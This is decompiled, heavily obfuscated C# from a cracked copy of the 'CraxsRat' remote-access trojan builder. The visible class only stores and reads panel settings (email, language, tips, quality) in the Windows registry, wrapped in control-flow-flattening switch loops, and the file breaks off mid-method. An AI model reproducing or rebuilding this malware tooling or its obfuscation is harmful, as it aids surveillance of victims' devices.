// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.RegistryHandler
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [StandardModule]
  internal sealed class RegistryHandler
  {
    public static string PORTS;
    public static int KeySize;
    public static int Microseconds;
    public static List<Client> WorkerRemove;
    private static string mainpath;

    public static string Get_EMAIL()
    {
      string email;
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
        try
        {
          RegistryKey registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
          try
          {
            object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue(EXGuarder.\u0037247311E));
label_3:
            int num1 = 359189932;
            while (true)
            {
              uint num2;
              switch ((num2 = (uint) (-(--num1 ^ ~-(2039762204 + 1039265718)) ^ -462880375 ^ -1723779868)) % 4U)
              {
                case 0:
                  goto label_3;
                case 2:
                  int num3 = objectValue == null ? 124848403 : (num3 = 784993277);
                  num1 = num3 ^ (int) num2 * 1962774291;
                  continue;
                case 3:
                  goto label_6;
                default:
                  goto label_18;
              }
            }
label_6:
            email = Codes.AES_Decrypt(registryKey2.GetValue(EXGuarder.\u0037247311E).ToString(), EXGuarder.\u003471B446F);
            goto label_19;
          }
          finally
          {
            if (registryKey2 != null)
            {
label_8:
              int num4 = 697004221;
              while (true)
              {
                uint num5;
                switch ((num5 = (uint) (-(--num4 ^ ~-(2039762204 + 1039265718)) ^ -462880375 ^ -1723779868)) % 3U)
                {
                  case 0:
                    goto label_8;
                  case 2:
                    ((IDisposable) registryKey2).Dispose();
                    num4 = (int) num5 * 1802793921 ^ 203199493;
                    continue;
                  default:
                    goto label_11;
                }
              }
            }
label_11:;
          }
        }
        finally
        {
          if (registryKey1 != null)
          {
label_13:
            int num6 = 1368971545;
            while (true)
            {
              uint num7;
              switch ((num7 = (uint) (-(--num6 ^ ~-(2039762204 + 1039265718)) ^ -462880375 ^ -1723779868)) % 3U)
              {
                case 0:
                  goto label_13;
                case 1:
                  ((IDisposable) registryKey1).Dispose();
                  num6 = (int) num7 * -249980633 ^ 658059926;
                  continue;
                default:
                  goto label_16;
              }
            }
          }
label_16:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_18:
      email = (string) null;
label_19:
      return email;
    }

    public static void Set_EMAIL(string key)
    {
      try
      {
        RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256).OpenSubKey(RegistryHandler.mainpath, true);
label_1:
        int num1 = 826327132;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(~(~num1 + (~1429218289 * 1757438097 ^ ~(-1168976185 * (-820687295 ^ -1216654076)))) - -1251967700 ^ -571663258)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              RegistryHandler.Set_OldEmail(key);
              registryKey.SetValue(EXGuarder.\u0035A59065A, (object) Codes.Encrypt(key, EXGuarder.\u0036C5E0239));
              num1 = (int) num2 * -1052669770 ^ -2122744178;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Set_OldEmail(string key)
    {
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
label_1:
        int num1 = -645867639;
        RegistryKey registryKey2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~(num1 * -1071029691)) % 4U)
          {
            case 0:
              registryKey2.SetValue(EXGuarder.\u0036F557415, (object) key);
              registryKey2.Close();
              num1 = (int) num2 * 1044623056 ^ -81845442;
              continue;
            case 1:
              registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
              num1 = (int) num2 * -581162700 ^ -636423556;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string getworning()
    {
      string str;
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
        try
        {
          RegistryKey registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
          try
          {
            object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue(EXGuarder.\u0031D4C643C));
label_3:
            int num1 = 1177979948;
            while (true)
            {
              uint num2;
              switch ((num2 = (uint) (-(num1 ^ -1280071127 ^ -1848784129 ^ -103337765 * 499760871 ^ 2008084054 ^ (-1195581723 - 1519426882 ^ ~-1713655019) - (1834146516 + 985272577 - 541450573) ^ --439376838) * -1954368115 + (997010654 - 66568861 - (-127478781 - 1642251605)))) % 5U)
              {
                case 0:
                  str = registryKey2.GetValue(EXGuarder.\u0031D4C643C).ToString();
                  num1 = (int) num2 * 1690482197 ^ 661890610;
                  continue;
                case 1:
                  goto label_19;
                case 2:
                  goto label_3;
                case 3:
                  int num3 = objectValue == null ? -125856671 : (num3 = -816965633);
                  num1 = num3 ^ (int) num2 * 1535965838;
                  continue;
                default:
                  goto label_18;
              }
            }
          }
          finally
          {
            if (registryKey2 != null)
            {
label_8:
              int num4 = -983951365;
              while (true)
              {
                uint num5;
                switch ((num5 = (uint) (-(num4 ^ -1280071127 ^ -1848784129 ^ -103337765 * 499760871 ^ 2008084054 ^ (-1195581723 - 1519426882 ^ ~-1713655019) - (1834146516 + 985272577 - 541450573) ^ --439376838) * -1954368115 + (997010654 - 66568861 - (-127478781 - 1642251605)))) % 3U)
                {
                  case 0:
                    goto label_8;
                  case 2:
                    ((IDisposable) registryKey2).Dispose();
                    num4 = (int) num5 * 441221076 ^ -204599520;
                    continue;
                  default:
                    goto label_11;
                }
              }
            }
label_11:;
          }
        }
        finally
        {
          if (registryKey1 != null)
          {
label_13:
            int num6 = 145493977;
            while (true)
            {
              uint num7;
              switch ((num7 = (uint) (-(num6 ^ -1280071127 ^ -1848784129 ^ -103337765 * 499760871 ^ 2008084054 ^ (-1195581723 - 1519426882 ^ ~-1713655019) - (1834146516 + 985272577 - 541450573) ^ --439376838) * -1954368115 + (997010654 - 66568861 - (-127478781 - 1642251605)))) % 3U)
              {
                case 1:
                  ((IDisposable) registryKey1).Dispose();
                  num6 = (int) num7 * 1871191790 ^ 1826889216;
                  continue;
                case 2:
                  goto label_13;
                default:
                  goto label_16;
              }
            }
          }
label_16:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_18:
      str = (string) null;
label_19:
      return str;
    }

    public static void setworning(string key)
    {
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
label_1:
        int num1 = 1610566733;
        RegistryKey registryKey2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 ^ 1927900285 * -2107611057 * 200176567) * -673815797 - (-1408855019 * 1142508885 ^ -1197495151 - 1438836415 ^ 232189977 + 1684262510) + -1664610687 * -245632448) * -1024497809 ^ 680032131)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              registryKey2.SetValue(EXGuarder.\u003310E7241, (object) key);
              num1 = (int) num2 * 2089448722 ^ -366194042;
              continue;
            case 3:
              registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
              num1 = (int) num2 * -56876153 ^ 1555583290;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        registryKey2.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string getwtipanti()
    {
      string str;
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
        try
        {
          RegistryKey registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
          try
          {
            object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue(EXGuarder.\u00323416066));
label_3:
            int num1 = -295545807;
            while (true)
            {
              int num2 = num1;
              uint num3;
              switch ((num3 = (uint) -((2133647736 ^ 1296485778) - (-((num2 ^ ~(-2114096799 * 2054632551 + --694321512 ^ -526980789 * 1546998540) + (1835595095 - (-1151887859 - 53904465) - 548045325 * (-1757262817 - 140727434) + (-(1554183163 + 136603695) - (-1279041414 - 635679423 - (1857835829 - 526577617))))) * 1997667073) - (909865216 - 636084531 + 677631222)))) % 5U)
              {
                case 0:
                  goto label_22;
                case 2:
                  int num4 = objectValue == null ? 21807900 : (num4 = 1201346955);
                  num1 = num4 ^ (int) num3 * -1289489669;
                  continue;
                case 3:
                  goto label_3;
                case 4:
                  str = registryKey2.GetValue(EXGuarder.\u00323416066).ToString();
                  num1 = (int) num3 * 1734423372 ^ 487208478;
                  continue;
                default:
                  goto label_21;
              }
            }
          }
          finally
          {
            if (registryKey2 != null)
            {
label_8:
              int num5 = -1657243839;
              while (true)
              {
                int num6 = num5;
                uint num7;
                switch ((num7 = (uint) -((2133647736 ^ 1296485778) - (-((num6 ^ ~(-2114096799 * 2054632551 + --694321512 ^ -526980789 * 1546998540) + (1835595095 - (-1151887859 - 53904465) - 548045325 * (-1757262817 - 140727434) + (-(1554183163 + 136603695) - (-1279041414 - 635679423 - (1857835829 - 526577617))))) * 1997667073) - (909865216 - 636084531 + 677631222)))) % 3U)
                {
                  case 0:
                    goto label_8;
                  case 1:
                    ((IDisposable) registryKey2).Dispose();
                    num5 = (int) num7 * 540042893 ^ -1396801047;
                    continue;
                  default:
                    goto label_11;
                }
              }
            }
label_11:;
          }
        }
        finally
        {
          if (registryKey1 != null)
          {
label_13:
            int num8 = -170589894;
            while (true)
            {
              int num9 = num8;
              uint num10;
              switch ((num10 = (uint) -((2133647736 ^ 1296485778) - (-((num9 ^ ~(-2114096799 * 2054632551 + --694321512 ^ -526980789 * 1546998540) + (1835595095 - (-1151887859 - 53904465) - 548045325 * (-1757262817 - 140727434) + (-(1554183163 + 136603695) - (-1279041414 - 635679423 - (1857835829 - 526577617))))) * 1997667073) - (909865216 - 636084531 + 677631222)))) % 3U)
              {
                case 0:
                  goto label_13;
                case 1:
                  ((IDisposable) registryKey1).Dispose();
                  num8 = (int) num10 * 515666390 ^ 499156113;
                  continue;
                default:
                  goto label_16;
              }
            }
          }
label_16:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_18:
        int num11 = 925335299;
        while (true)
        {
          int num12 = num11;
          uint num13;
          switch ((num13 = (uint) -((2133647736 ^ 1296485778) - (-((num12 ^ ~(-2114096799 * 2054632551 + --694321512 ^ -526980789 * 1546998540) + (1835595095 - (-1151887859 - 53904465) - 548045325 * (-1757262817 - 140727434) + (-(1554183163 + 136603695) - (-1279041414 - 635679423 - (1857835829 - 526577617))))) * 1997667073) - (909865216 - 636084531 + 677631222)))) % 3U)
          {
            case 0:
              goto label_18;
            case 1:
              ProjectData.ClearProjectError();
              num11 = (int) num13 * 2109821307 ^ 574381285;
              continue;
            default:
              goto label_21;
          }
        }
      }
label_21:
      str = (string) null;
label_22:
      return str;
    }

    public static void settipanti(string key)
    {
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
label_1:
        int num1 = -109122091;
        RegistryKey registryKey2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-((~num1 ^ 132452691 * ((1921044766 - 1185315651) * -96981117) + 2059948243) - (432009484 - 34949508 * 871204619)) ^ 592791104 ^ 442514242)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              registryKey2.SetValue(EXGuarder.\u0033D2A014A, (object) key);
              num1 = (int) num2 * 529640825 ^ 875420855;
              continue;
            case 2:
              registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
              num1 = (int) num2 * -1105728124 ^ -173109192;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        registryKey2.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string Get_ID_ASSIST()
    {
      string idAssist;
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
        try
        {
          RegistryKey registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
          try
          {
            object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue(EXGuarder.\u0035036222F));
label_3:
            int num1 = -991673980;
            while (true)
            {
              uint num2;
              switch ((num2 = (uint) (~-((num1 ^ --(-1171893293 * -1911492401 * -1258256505 ^ ~~-1705036569)) * -1282590653) + (370129631 ^ 992853545))) % 5U)
              {
                case 0:
                  goto label_22;
                case 1:
                  idAssist = registryKey2.GetValue(EXGuarder.\u0035036222F).ToString();
                  num1 = (int) num2 * -1090983187 ^ -842487047;
                  continue;
                case 2:
                  int num3 = objectValue == null ? -1746873727 : (num3 = -812183544);
                  num1 = num3 ^ (int) num2 * -717961869;
                  continue;
                case 3:
                  goto label_3;
                default:
                  goto label_21;
              }
            }
          }
          finally
          {
            if (registryKey2 != null)
            {
label_8:
              int num4 = 1228856206;
              while (true)
              {
                uint num5;
                switch ((num5 = (uint) (~-((num4 ^ --(-1171893293 * -1911492401 * -1258256505 ^ ~~-1705036569)) * -1282590653) + (370129631 ^ 992853545))) % 3U)
                {
                  case 1:
                    ((IDisposable) registryKey2).Dispose();
                    num4 = (int) num5 * -2129594787 ^ 598694003;
                    continue;
                  case 2:
                    goto label_8;
                  default:
                    goto label_11;
                }
              }
            }
label_11:;
          }
        }
        finally
        {
          if (registryKey1 != null)
          {
label_13:
            int num6 = 1466441359;
            while (true)
            {
              uint num7;
              switch ((num7 = (uint) (~-((num6 ^ --(-1171893293 * -1911492401 * -1258256505 ^ ~~-1705036569)) * -1282590653) + (370129631 ^ 992853545))) % 3U)
              {
                case 1:
                  ((IDisposable) registryKey1).Dispose();
                  num6 = (int) num7 * -770064212 ^ 668125700;
                  continue;
                case 2:
                  goto label_13;
                default:
                  goto label_16;
              }
            }
          }
label_16:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_18:
        int num8 = -471279339;
        while (true)
        {
          uint num9;
          switch ((num9 = (uint) (~-((num8 ^ --(-1171893293 * -1911492401 * -1258256505 ^ ~~-1705036569)) * -1282590653) + (370129631 ^ 992853545))) % 3U)
          {
            case 0:
              goto label_18;
            case 2:
              ProjectData.ClearProjectError();
              num8 = (int) num9 * -77826920 ^ -1901631981;
              continue;
            default:
              goto label_21;
          }
        }
      }
label_21:
      idAssist = (string) null;
label_22:
      return idAssist;
    }

    public static void Set_ID_ASSIST(string key)
    {
      try
      {
        RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256).OpenSubKey(RegistryHandler.mainpath, true);
        registryKey.SetValue(EXGuarder.\u0031E765639, (object) key);
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string GET_FTtip()
    {
      string fttip;
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
        try
        {
          RegistryKey registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
          try
          {
            object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue(EXGuarder.\u003005A0320));
label_3:
            int num1 = 543943513;
            while (true)
            {
              uint num2;
              switch ((num2 = (uint) ((num1 + ~(~(-1104621591 - -1348351773) - -210727939 + ~((1525452179 ^ -1951932735) * -909019047)) ^ -1473631087 - -911803809 * (-1578440442 ^ -1846642838 ^ -773343716)) - (~~1305949544 + -1359739347 * 872285021))) % 4U)
              {
                case 0:
                  goto label_6;
                case 1:
                  int num3 = objectValue == null ? 932811254 : (num3 = -1757233361);
                  num1 = num3 ^ (int) num2 * -423603807;
                  continue;
                case 2:
                  goto label_3;
                default:
                  goto label_21;
              }
            }
label_6:
            fttip = registryKey2.GetValue(EXGuarder.\u003005A0320).ToString();
            goto label_22;
          }
          finally
          {
            if (registryKey2 != null)
            {
label_8:
              int num4 = -1105450288;
              while (true)
              {
                uint num5;
                switch ((num5 = (uint) ((num4 + ~(~(-1104621591 - -1348351773) - -210727939 + ~((1525452179 ^ -1951932735) * -909019047)) ^ -1473631087 - -911803809 * (-1578440442 ^ -1846642838 ^ -773343716)) - (~~1305949544 + -1359739347 * 872285021))) % 3U)
                {
                  case 1:
                    ((IDisposable) registryKey2).Dispose();
                    num4 = (int) num5 * -1506892855 ^ 1209093066;
                    continue;
                  case 2:
                    goto label_8;
                  default:
                    goto label_11;
                }
              }
            }
label_11:;
          }
        }
        finally
        {
          if (registryKey1 != null)
          {
label_13:
            int num6 = 1933166029;
            while (true)
            {
              uint num7;
              switch ((num7 = (uint) ((num6 + ~(~(-1104621591 - -1348351773) - -210727939 + ~((1525452179 ^ -1951932735) * -909019047)) ^ -1473631087 - -911803809 * (-1578440442 ^ -1846642838 ^ -773343716)) - (~~1305949544 + -1359739347 * 872285021))) % 3U)
              {
                case 0:
                  goto label_13;
                case 1:
                  ((IDisposable) registryKey1).Dispose();
                  num6 = (int) num7 * 1973456793 ^ -886813954;
                  continue;
                default:
                  goto label_16;
              }
            }
          }
label_16:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_18:
        int num8 = -2062731039;
        while (true)
        {
          uint num9;
          switch ((num9 = (uint) ((num8 + ~(~(-1104621591 - -1348351773) - -210727939 + ~((1525452179 ^ -1951932735) * -909019047)) ^ -1473631087 - -911803809 * (-1578440442 ^ -1846642838 ^ -773343716)) - (~~1305949544 + -1359739347 * 872285021))) % 3U)
          {
            case 0:
              goto label_18;
            case 1:
              ProjectData.ClearProjectError();
              num8 = (int) num9 * -1048213772 ^ -1186839299;
              continue;
            default:
              goto label_21;
          }
        }
      }
label_21:
      fttip = (string) null;
label_22:
      return fttip;
    }

    public static void Set_FTtip(string key)
    {
      try
      {
        RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256).OpenSubKey(RegistryHandler.mainpath, true);
label_1:
        int num1 = -486897654;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 * 262634285 - ((~-1755955698 ^ --260055022 ^ -846192667) - -((-287838656 ^ -2021975825) - -1682684204)) ^ 1393081560)) % 4U)
          {
            case 0:
              registryKey.Close();
              num1 = (int) num2 * 379462364 ^ 928028024;
              continue;
            case 1:
              registryKey.SetValue(EXGuarder.\u003612E302C, (object) key);
              num1 = (int) num2 * -377617936 ^ 1067328429;
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string Get_Language()
    {
      string language;
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
        try
        {
          RegistryKey registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
          try
          {
            if (RuntimeHelpers.GetObjectValue(registryKey2.GetValue(EXGuarder.\u00320547829)) != null)
            {
label_3:
              int num1 = 700916185;
              while (true)
              {
                uint num2;
                switch ((num2 = (uint) (-(~((num1 ^ -689019383 * (-194299148 ^ -1292216751) - -~-1946412678 - -(~(-2119094153 ^ -1851933376) + (482581777 - 952044686))) - ~(902848136 + 1479907529 + (-701903844 - 936319962) + (-1923285155 - 105056219 ^ 1327624903 * -608701591))) * -1493581003) - -1257260119)) % 4U)
                {
                  case 0:
                    goto label_3;
                  case 1:
                    language = registryKey2.GetValue(EXGuarder.\u00320547829).ToString();
                    num1 = (int) num2 * 142678512 ^ 1096324987;
                    continue;
                  case 3:
                    goto label_18;
                  default:
                    goto label_17;
                }
              }
            }
          }
          finally
          {
            if (registryKey2 != null)
            {
label_7:
              int num3 = -328876959;
              while (true)
              {
                uint num4;
                switch ((num4 = (uint) (-(~((num3 ^ -689019383 * (-194299148 ^ -1292216751) - -~-1946412678 - -(~(-2119094153 ^ -1851933376) + (482581777 - 952044686))) - ~(902848136 + 1479907529 + (-701903844 - 936319962) + (-1923285155 - 105056219 ^ 1327624903 * -608701591))) * -1493581003) - -1257260119)) % 3U)
                {
                  case 0:
                    goto label_7;
                  case 1:
                    ((IDisposable) registryKey2).Dispose();
                    num3 = (int) num4 * -57291892 ^ 169354095;
                    continue;
                  default:
                    goto label_10;
                }
              }
            }
label_10:;
          }
        }
        finally
        {
          if (registryKey1 != null)
          {
label_12:
            int num5 = -1783797429;
            while (true)
            {
              uint num6;
              switch ((num6 = (uint) (-(~((num5 ^ -689019383 * (-194299148 ^ -1292216751) - -~-1946412678 - -(~(-2119094153 ^ -1851933376) + (482581777 - 952044686))) - ~(902848136 + 1479907529 + (-701903844 - 936319962) + (-1923285155 - 105056219 ^ 1327624903 * -608701591))) * -1493581003) - -1257260119)) % 3U)
              {
                case 1:
                  ((IDisposable) registryKey1).Dispose();
                  num5 = (int) num6 * 1159507531 ^ 1928930970;
                  continue;
                case 2:
                  goto label_12;
                default:
                  goto label_15;
              }
            }
          }
label_15:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_17:
      language = (string) null;
label_18:
      return language;
    }

    public static void Set_Language(string key)
    {
      try
      {
        RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256).OpenSubKey(RegistryHandler.mainpath, true);
label_1:
        int num1 = -205395551;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 + -((1089071611 - 68768287) * -1055020793 - 995113629 + -(--1571355960 * -1779859783)) ^ (~(-502130077 * 1482185556) ^ -1265902309 ^ 402371154 ^ 1843843675 * -1797229065) * -487145105)) % 3U)
          {
            case 0:
              goto label_11;
            case 1:
              registryKey.SetValue(EXGuarder.\u003761A0204, (object) key);
              registryKey.Close();
              num1 = (int) num2 * 501644011 ^ 1300835449;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_11:
        return;
label_9:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_7:
        int num3 = -795250164;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) ~(num3 + -((1089071611 - 68768287) * -1055020793 - 995113629 + -(--1571355960 * -1779859783)) ^ (~(-502130077 * 1482185556) ^ -1265902309 ^ 402371154 ^ 1843843675 * -1797229065) * -487145105)) % 3U)
          {
            case 0:
              goto label_7;
            case 1:
              goto label_5;
            case 2:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * -649061854 ^ -962626099;
              continue;
            default:
              goto label_3;
          }
        }
label_5:
        return;
label_3:;
      }
    }

    public static string GET_Tip(string id)
    {
      string tip;
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
        try
        {
          RegistryKey registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
          try
          {
            object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue(id));
label_3:
            int num1 = 254410273;
            while (true)
            {
              uint num2;
              switch ((num2 = (uint) ((~(num1 - -494026465 * ((479563143 - 785050460 ^ ~-785521436) + ((782308537 ^ -465079052) - -2063759379) ^ 1000799861 * -304105163 - 380283380)) * -60428863 ^ (-1258076910 ^ 409972282) + --14582515) * -1150830229 * 1096156787)) % 5U)
              {
                case 0:
                  goto label_3;
                case 2:
                  tip = registryKey2.GetValue(id).ToString();
                  num1 = (int) num2 * -1201224644 ^ 1255218160;
                  continue;
                case 3:
                  int num3 = objectValue == null ? 1529389702 : (num3 = 2026653646);
                  num1 = num3 ^ (int) num2 * 1267655850;
                  continue;
                case 4:
                  goto label_19;
                default:
                  goto label_18;
              }
            }
          }
          finally
          {
            if (registryKey2 != null)
            {
label_8:
              int num4 = 1678771994;
              while (true)
              {
                uint num5;
                switch ((num5 = (uint) ((~(num4 - -494026465 * ((479563143 - 785050460 ^ ~-785521436) + ((782308537 ^ -465079052) - -2063759379) ^ 1000799861 * -304105163 - 380283380)) * -60428863 ^ (-1258076910 ^ 409972282) + --14582515) * -1150830229 * 1096156787)) % 3U)
                {
                  case 0:
                    goto label_8;
                  case 1:
                    ((IDisposable) registryKey2).Dispose();
                    num4 = (int) num5 * 651661692 ^ 691463839;
                    continue;
                  default:
                    goto label_11;
                }
              }
            }
label_11:;
          }
        }
        finally
        {
          if (registryKey1 != null)
          {
label_13:
            int num6 = 1257988964;
            while (true)
            {
              uint num7;
              switch ((num7 = (uint) ((~(num6 - -494026465 * ((479563143 - 785050460 ^ ~-785521436) + ((782308537 ^ -465079052) - -2063759379) ^ 1000799861 * -304105163 - 380283380)) * -60428863 ^ (-1258076910 ^ 409972282) + --14582515) * -1150830229 * 1096156787)) % 3U)
              {
                case 0:
                  goto label_13;
                case 2:
                  ((IDisposable) registryKey1).Dispose();
                  num6 = (int) num7 * 1077616013 ^ 301452897;
                  continue;
                default:
                  goto label_16;
              }
            }
          }
label_16:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_18:
      tip = (string) null;
label_19:
      return tip;
    }

    public static void SET_Tip(string key, string id)
    {
      try
      {
        RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256).OpenSubKey(RegistryHandler.mainpath, true);
        registryKey.SetValue(id, (object) key);
label_1:
        int num1 = 1879259503;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-~num1 * 553194409 ^ -401844943 * (2012088850 ^ -1933775537)) - 1668589131 ^ 1434593572)) % 3U)
          {
            case 0:
              goto label_3;
            case 1:
              registryKey.Close();
              num1 = (int) num2 * 1668649920 ^ -2116167448;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string GET_SoundID()
    {
      string soundId;
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
        try
        {
          RegistryKey registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
          try
          {
            if (RuntimeHelpers.GetObjectValue(registryKey2.GetValue(ZoomPictureBox.Selectedsound)) != null)
            {
label_3:
              int num1 = 736481703;
              while (true)
              {
                uint num2;
                switch ((num2 = (uint) (-(--num1 ^ ~(1067160719 * (-1853007006 - 1636311323))) ^ 1256514006 + 2076994178 ^ 1684722078)) % 4U)
                {
                  case 1:
                    soundId = registryKey2.GetValue(ZoomPictureBox.Selectedsound).ToString();
                    num1 = (int) num2 * 2059541880 ^ 1411984566;
                    continue;
                  case 2:
                    goto label_18;
                  case 3:
                    goto label_3;
                  default:
                    goto label_17;
                }
              }
            }
          }
          finally
          {
            if (registryKey2 != null)
            {
label_7:
              int num3 = 936674999;
              while (true)
              {
                uint num4;
                switch ((num4 = (uint) (-(--num3 ^ ~(1067160719 * (-1853007006 - 1636311323))) ^ 1256514006 + 2076994178 ^ 1684722078)) % 3U)
                {
                  case 0:
                    goto label_7;
                  case 2:
                    ((IDisposable) registryKey2).Dispose();
                    num3 = (int) num4 * -1019354736 ^ -978037763;
                    continue;
                  default:
                    goto label_10;
                }
              }
            }
label_10:;
          }
        }
        finally
        {
          if (registryKey1 != null)
          {
label_12:
            int num5 = 558478063;
            while (true)
            {
              uint num6;
              switch ((num6 = (uint) (-(--num5 ^ ~(1067160719 * (-1853007006 - 1636311323))) ^ 1256514006 + 2076994178 ^ 1684722078)) % 3U)
              {
                case 0:
                  goto label_12;
                case 2:
                  ((IDisposable) registryKey1).Dispose();
                  num5 = (int) num6 * -883974304 ^ 697765065;
                  continue;
                default:
                  goto label_15;
              }
            }
          }
label_15:;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_17:
      soundId = (string) null;
label_18:
      return soundId;
    }

    public static void SET_qulity(string key, string id)
    {
      try
      {
        RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, (RegistryView) 256);
label_1:
        int num1 = 1020753165;
        RegistryKey registryKey2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((num1 ^ (-1767056162 + --21137746 + (384037812 - 2059727814 - (-277427695 - -1753770504))) * 1521958257 - -((--725293291 ^ ~688754464) + (344397748 - 1210625615 - -980708990))) - -~(1690986655 - -17706617 - (-87470030 - 1329030880)) ^ ~--1209888150 - 1314219513)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              registryKey2 = registryKey1.OpenSubKey(RegistryHandler.mainpath, true);
              registryKey2.SetValue(id, (object) key);
              num1 = (int) num2 * 31262863 ^ 932698931;
              continue;
            case 2:
              registryKey2.Close();
              num1 = (int) num2 * -728513397 ^ 1113639377;
